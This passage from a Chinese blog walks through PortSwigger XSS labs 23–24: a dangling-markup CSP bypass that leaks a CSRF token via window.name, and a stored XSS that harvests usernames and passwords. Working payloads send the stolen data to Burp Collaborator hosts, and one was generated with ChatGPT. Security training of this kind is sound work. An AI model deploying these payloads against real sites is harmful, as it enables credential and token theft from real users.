<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205101848.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205101848.png"></a></p>
<p>本题的重点是绕过 CSP。</p>
<p>思路：</p>
<ol>
<li>使用 base 元素中的 target 属性设置超链接跳转行为，如果 target 是自定义的内容，超链接会默认跳转到一个新 tab，并设置 <code>window.name</code> 为 target 的值。也就是说如果我们使用未闭合的 target，如 <code>target=&#39;hello</code> 就可以将注入点到下一个 ‘ 之间的内容设置为 <code>window.name</code>。 具体参看：<a target="_blank" rel="noopener" href="https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup">Evading CSP with DOM-based dangling markup</a></li>
<li>注入一个 <code>&lt;a&gt;</code> 标签，超链接定义为攻击者的服务器（Burp Collaborator），将 <code>window.name</code> 发送过来，其中可能就有受害人的 csrf token 等敏感信息。</li>
<li>由于修改邮箱要用到用户 session，所以简单构造一个修改邮箱的报文不起作用。这里使用 CSRF 攻击伪造访问 <code>/my-account/change-email</code> 接口的请求，当用户点击时，就会将 email 连同 csrf token 发送到服务端，从而修改用户邮箱。</li>
</ol>
<blockquote>
<p>[!note]<br>通过 base 元素修改 window.name 好像 Google Chrome 不行，得用火狐浏览器。 </p>
</blockquote>
<p>上面那个<a target="_blank" rel="noopener" href="https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup">博客</a>中的 POC，在 Chrome 中无效，但在 Firefox 中正确弹出 <code>window.name</code>.</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205105912.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205105912.png"></a></p>
<p>谷歌：<br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205105829.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205105829.png"></a><br>火狐：<br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205105813.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205105813.png"></a><br>payload:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">name</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&#x27;//n4scmpf0j3enw70v6zn2q72980er2hq6.oastify.com?&#x27;</span>+<span class="built_in">encodeURIComponent</span>(<span class="variable language_">window</span>.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">     location = <span class="string">&#x27;https://0afd009f048818e68233ed2600c000f6.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0aeb009f040a18be8206ec3d01a800fe.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>点击 “View exploit” 看看效果。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205091711.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205091711.png"></a></p>
<p>因为刚开始 <code>window.name</code> 为空，所以设置 <code>location</code>，注入 <code>&lt;a&gt;</code> 标签，且包含一个未闭合的 base 标签的 target 属性。 </p>
<p>点击 “Click me” 会将 <code>window.name</code> 发送给 Collaborator，其中就有受害人的 csrf token。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205105300.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205105300.png"></a></p>
<p>解码。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205105322.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205105322.png"></a></p>
<blockquote>
<p>[!question] 问题<br>本地 view exploit 嘎嘎拿 csrf token，deliver exploit to victim 就不行了，受害人不会用的 Chrome 吧？</p>
</blockquote>
<h1 id="24-Lab-Exploiting-cross-site-scripting-to-capture-passwords"><a href="#24-Lab-Exploiting-cross-site-scripting-to-capture-passwords" class="headerlink" title="24 Lab: Exploiting cross-site scripting to capture passwords"></a>24 Lab: Exploiting cross-site scripting to capture passwords</h1><p>评论的内容部分即可注入。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205115211.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205115211.png"></a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>please input your passwords!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> pwd = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;password&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&#x27;https://5oujl1cedfln09yyy7nqkext6kcb01oq.oastify.com?pwd=&#x27;</span>+pwd;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这玩意儿老发一堆空值。</p>
<p>修改 payload，让 ChatGPT 给咱生成一个。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;loginForm&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>Password:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;username&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;input&#x27;</span>, sendDataWhenReady);</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;password&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;input&#x27;</span>, sendDataWhenReady);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">sendDataWhenReady</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> username = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;username&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> password = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;password&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// Check if both fields have values</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Use Fetch API to send the data</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;https://yacmzgegtcxk7vho6u5znwy6pxvoje73.oastify.com&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; username, password &#125;),</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Optionally, clear the form fields after sending the data</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;loginForm&#x27;</span>).<span class="title function_">reset</span>();</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205133010.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205133010.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205133033.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205133033.png"></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;a&quot;,&quot;password&quot;:&quot;qy1dkc59nd0tr23syh3&quot;&#125;</span><br><span class="line">&#123;&quot;username&quot;:&quot;dministrator&quot;,&quot;password&quot;:&quot;y&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>这是要让我排列组合？<code>&quot;username&quot;:&quot;administrator&quot;,&quot;password&quot;:&quot;yqy1dkc59nd0tr23syh3&quot;</code></p>
<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 更新 start &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<p><code>document.getElementById(&#39;loginForm&#39;).reset();</code> 我应该把这玩意删了的，一个劲给我发表单，不过如果删了，我是不是就拿不到用户名密码了，我也是排列组合的emmm.</p>
<p>好吧，监听器写的有问题，不如直接 <code>onchange</code>。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/a.png" data-caption=""><img src="/images/2024/02/20/a.png"></a></p>
<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 更新 end &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<p>下面给出官方 solution，蛮精简的。<code>username.value</code> 就能读取用户名？我还用了 <code>document.getElementById</code>，还用 <code>addEventListener</code> 监听输入行为，其实一个 <code>onchange</code> 就完事了。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">username</span> <span class="attr">id</span>=<span class="string">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">password</span> <span class="attr">onchange</span>=<span class="string">&quot;if(this.value.length)fetch(&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;,&#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">method:&#x27;POST&#x27;,</span></span></span><br><span class="line"><span class="string"><span class="tag">mode: &#x27;no-cors&#x27;,</span></span></span><br><span class="line"><span class="string"><span class="tag">body:username.value+&#x27;:&#x27;+this.value</span></span></span><br><span class="line"><span class="string"><span class="tag">&#125;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240205134534.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240205134534.png"></a></p>

  </div>

  <!-- 版权声明 -->
  


</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a href="/tags/">标签</a></li>
        
          <li><a href="/search/">搜索</a></li>
        
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Lab-Reflected-XSS-into-HTML-context-with-nothing-encoded"><span class="toc-number">1.</span> <span class="toc-text">1 Lab: Reflected XSS into HTML context with nothing encoded</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Lab-Stored-XSS-into-HTML-context-with-nothing-encoded"><span class="toc-number">2.</span> <span class="toc-text">2 Lab: Stored XSS into HTML context with nothing encoded</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-Lab-DOM-XSS-in-document-write-sink-using-source-location-search"><span class="toc-number">3.</span> <span class="toc-text">3 Lab: DOM XSS in document.write sink using source location.search</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-Lab-DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element"><span class="toc-number">4.</span> <span class="toc-text">4 Lab: DOM XSS in document.write sink using source location.search inside a select element</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-Lab-DOM-XSS-in-innerHTML-sink-using-source-location-search"><span class="toc-number">5.</span> <span class="toc-text">5 Lab: DOM XSS in innerHTML sink using source location.search</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-Lab-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><span class="toc-number">6.</span> <span class="toc-text">6 Lab: DOM XSS in jQuery anchor href attribute sink using location.search source</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-Lab-DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event"><span class="toc-number">7.</span> <span class="toc-text">7 Lab: DOM XSS in jQuery selector sink using a hashchange event</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-Lab-Reflected-DOM-XSS"><span class="toc-number">8.</span> <span class="toc-text">8 Lab: Reflected DOM XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9-Lab-Stored-DOM-XSS"><span class="toc-number">9.</span> <span class="toc-text">9 Lab: Stored DOM XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10-Lab-Reflected-XSS-into-HTML-context-with-most-tags-and-attributes-blocked"><span class="toc-number">10.</span> <span class="toc-text">10 Lab: Reflected XSS into HTML context with most tags and attributes blocked</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-Lab-Reflected-XSS-into-HTML-context-with-all-tags-blocked-except-custom-ones"><span class="toc-number">11.</span> <span class="toc-text">11 Lab: Reflected XSS into HTML context with all tags blocked except custom ones</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#12-Lab-Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded"><span class="toc-number">12.</span> <span class="toc-text">12 Lab: Reflected XSS into attribute with angle brackets HTML-encoded</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#13-Lab-Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded"><span class="toc-number">13.</span> <span class="toc-text">13 Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#14-Lab-Reflected-XSS-in-canonical-link-tag"><span class="toc-number">14.</span> <span class="toc-text">14 Lab: Reflected XSS in canonical link tag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#15-Lab-Reflected-XSS-into-a-JavaScript-string-with-single-quote-and-backslash-escaped"><span class="toc-number">15.</span> <span class="toc-text">15 Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#16-Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded"><span class="toc-number">16.</span> <span class="toc-text">16 Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#17-Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-escaped"><span class="toc-number">17.</span> <span class="toc-text">17 Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#18-Lab-Stored-XSS-into-onclick-event-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-and-backslash-escaped"><span class="toc-number">18.</span> <span class="toc-text">18 Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#19-Lab-Reflected-XSS-in-a-JavaScript-URL-with-some-characters-blocked"><span class="toc-number">19.</span> <span class="toc-text">19 Lab: Reflected XSS in a JavaScript URL with some characters blocked</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#20-Lab-Reflected-XSS-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-Unicode-escaped"><span class="toc-number">20.</span> <span class="toc-text">20 Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#21-Lab-Reflected-XSS-with-some-SVG-markup-allowed"><span class="toc-number">21.</span> <span class="toc-text">21 Lab: Reflected XSS with some SVG markup allowed</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#22-Lab-Exploiting-cross-site-scripting-to-steal-cookies"><span class="toc-number">22.</span> <span class="toc-text">22 Lab: Exploiting cross-site scripting to steal cookies</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#23-Lab-Reflected-XSS-protected-by-very-strict-CSP-with-dangling-markup-attack"><span class="toc-number">23.</span> <span class="toc-text">23 Lab: Reflected XSS protected by very strict CSP, with dangling markup attack</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#24-Lab-Exploiting-cross-site-scripting-to-capture-passwords"><span class="toc-number">24.</span> <span class="toc-text">24 Lab: Exploiting cross-site scripting to capture passwords</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://by-musi.github.io/2024/02/20/PortSwigger_xss_labs/&title=PortSwigger xss labs"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    CaiShao
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/tags/">标签</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     -->
      </ul>
      <ul>
        
          <span id="busuanzi_container_site_pv">
              本站总访问量<span id="busuanzi_value_site_pv"></span>次
          </span>
          <span class="post-meta-divider"> | </span>
          <span id="busuanzi_container_site_uv" style='display:none'>
                本站访客数<span id="busuanzi_value_site_uv"></span>人
          </span>
        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'BY-musi/BY-musi.github.io';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'comment';
      var utterances_theme = 'photon-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>


<!-- FancyBox -->

  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
  <script>
    Fancybox.bind('[data-fancybox="gallery"]', {
      //
    });    
  </script>


<!-- Copyright -->

</body>
</html>
